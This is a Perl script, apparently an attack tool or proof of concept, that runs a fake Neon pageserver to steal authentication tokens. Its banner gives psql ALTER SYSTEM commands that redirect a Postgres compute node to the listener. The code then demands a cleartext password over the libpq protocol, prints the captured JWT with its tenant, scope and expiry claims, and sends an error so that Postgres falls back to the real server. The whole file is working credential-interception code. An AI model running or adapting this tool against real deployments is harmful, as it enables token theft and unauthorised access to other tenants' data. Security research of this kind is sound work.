#!/usr/bin/perl


use strict;
use warnings;
use IO::Socket::INET;
use MIME::Base64 qw(decode_base64);
use POSIX qw(strftime);

$| = 1;  # unbuffered output

my $PORT = $ARGV[0] // 16400;

print STDERR "[*] Fake Neon Pageserver — JWT interceptor\n";
print STDERR "[*] Listening on 0.0.0.0:$PORT\n";
print STDERR "[*] To redirect compute:\n";
print STDERR "[*]   psql -U cloud_admin -c \"ALTER SYSTEM SET neon.pageserver_connstring = 'host=127.0.0.1 port=$PORT';\"\n";
print STDERR "[*]   psql -U cloud_admin -c \"SELECT pg_reload_conf();\"\n\n";

my $server = IO::Socket::INET->new(
    LocalAddr => '0.0.0.0',
    LocalPort => $PORT,
    Type      => SOCK_STREAM,
    Reuse     => 1,
    Listen    => 32,
) or die "[!] Cannot bind port $PORT: $!\n";

$SIG{CHLD} = 'IGNORE';  # auto-reap children

while (1) {
    my $client = $server->accept() or next;
    my $pid = fork();
    if (!defined $pid) { warn "fork: $!"; $client->close(); next; }
    if ($pid == 0) {
        $server->close();
        eval { handle_client($client) };
        warn "[!] handler died: $@\n" if $@;
        $client->close();
        exit 0;
    }
    $client->close();
}

# ── helpers ────────────────────────────────────────────────────────────────

sub recv_n {
    my ($s, $n) = @_;
    my $buf = '';
    while (length($buf) < $n) {
        my $r = $s->read(my $tmp, $n - length($buf));
        die "connection closed\n" unless $r;
        $buf .= $tmp;
    }
    return $buf;
}

# Send a framed libpq message: type(1) + int32(len) + payload
sub send_msg {
    my ($s, $type, $payload) = @_;
    print $s $type . pack('N', length($payload) + 4) . $payload;
}

sub send_error {
    my ($s, $msg) = @_;
    # ErrorResponse fields: S=severity V=severity C=sqlstate M=message \0=terminator
    my $body = "SFATAL\0VFATAL\0C08006\0M$msg\0\0";
    send_msg($s, 'E', $body);
}

sub decode_jwt {
    my ($token) = @_;
    my @parts = split /\./, $token;
    return {} unless @parts >= 2;
    my $b64 = $parts[1];
    $b64 =~ tr/-_/+\//;                          # base64url -> base64
    $b64 .= '=' x ((4 - length($b64) % 4) % 4);  # padding
    my $json = eval { decode_base64($b64) } // '';
    my %claims;
    while ($json =~ /"(\w+)"\s*:\s*"([^"]+)"/g) { $claims{$1} = $2; }
    while ($json =~ /"(\w+)"\s*:\s*(\d+)/g)      { $claims{$1} = $2; }
    return \%claims;
}

# ── main handler ───────────────────────────────────────────────────────────

sub handle_client {
    my ($sock) = @_;
    $sock->autoflush(1);
    my $peer = $sock->peerhost . ':' . $sock->peerport;
    print STDERR "[+] $peer connected\n";

    # ── 1. Startup (may be preceded by SSLRequest) ──────────────────────
    my $hdr = recv_n($sock, 4);
    my $len = unpack('N', $hdr);

    if ($len == 8) {
        my $code = unpack('N', recv_n($sock, 4));
        if ($code == 80877103) {          # 0x04d2162f = SSLRequest
            print STDERR "    ssl: rejected (sending N)\n";
            print $sock 'N';
        } elsif ($code == 80877102) {     # 0x04d2162e = CancelRequest — ignore
            $sock->close(); return;
        }
        $hdr = recv_n($sock, 4);
        $len = unpack('N', $hdr);
    }

    my $startup = recv_n($sock, $len - 4);
    printf STDERR "    startup: protocol=0x%08x\n", unpack('N', substr($startup, 0, 4));

    my %params;
    my @kv = split /\0/, substr($startup, 4);
    for (my $i = 0; $i + 1 < @kv; $i += 2) {
        next unless $kv[$i];
        $params{$kv[$i]} = $kv[$i+1];
        print STDERR "    param: $kv[$i] = $kv[$i+1]\n";
    }

    # ── 2. Demand cleartext password (JWT) ──────────────────────────────
    send_msg($sock, 'R', pack('N', 3));   # AuthenticationCleartextPassword

    my $ptype    = recv_n($sock, 1);
    my $plen     = unpack('N', recv_n($sock, 4));
    my $password = recv_n($sock, $plen - 4);
    $password =~ s/\0+$//;

    die "expected PasswordMessage, got: " . ord($ptype) . "\n"
        unless $ptype eq 'p';

    # ── 3. Print the JWT ─────────────────────────────────────────────────
    my $bar = '=' x 72;
    print "\n$bar\n";
    print "[JWT CAPTURED]  $peer\n";
    print "$bar\n";
    print "$password\n";
    print "$bar\n";

    my $claims = decode_jwt($password);
    if (%$claims) {
        printf "[scope]       %s\n",   $claims->{scope}       // '?';
        printf "[tenant_id]   %s\n",   $claims->{tenant_id}   // '?';
        printf "[timeline_id] %s\n",   $claims->{timeline_id} // '(not in claims)';
        if ($claims->{exp}) {
            my $ts = strftime('%Y-%m-%d %H:%M:%S UTC', gmtime($claims->{exp}));
            printf "[expires]     %s  (%d s from now)\n",
                $ts, $claims->{exp} - time();
        }
        printf "[issued]      %s\n",
            strftime('%Y-%m-%d %H:%M:%S UTC', gmtime($claims->{iat}))
            if $claims->{iat};
    }
    print "$bar\n\n";

    # ── 4. Complete authentication ───────────────────────────────────────
    send_msg($sock, 'R', pack('N', 0));   # AuthenticationOk

    for my $kv (
        [server_version    => '15.0'],
        [server_encoding   => 'UTF8'],
        [client_encoding   => 'UTF8'],
        [integer_datetimes => 'on'],
        [DateStyle         => 'ISO, MDY'],
    ) {
        send_msg($sock, 'S', "$kv->[0]\0$kv->[1]\0");
    }

    send_msg($sock, 'K', pack('NN', $$, int(rand(0x7fffffff))));  # BackendKeyData
    send_msg($sock, 'Z', 'I');                                     # ReadyForQuery (idle)

    # ── 5. Read the pagestream query ─────────────────────────────────────
    my $qtype   = recv_n($sock, 1);
    my $qlen    = unpack('N', recv_n($sock, 4));
    my $query   = recv_n($sock, $qlen - 4);
    $query =~ s/\0+$//;

    print STDERR "[*] query: $query\n";

    if ($query =~ /^(pagestream_v\d+)\s+(\S+)\s+(\S+)/) {
        print STDERR "[*] version:   $1\n";
        print STDERR "[*] tenant:    $2\n";
        print STDERR "[*] timeline:  $3\n";
    }

    # ── 6. Send error — postgres will log it and reconnect ───────────────
    send_error($sock, 'fake_pageserver: JWT captured — reconnect to real pageserver');
    $sock->close();
    print STDERR "[*] $peer done\n";
}
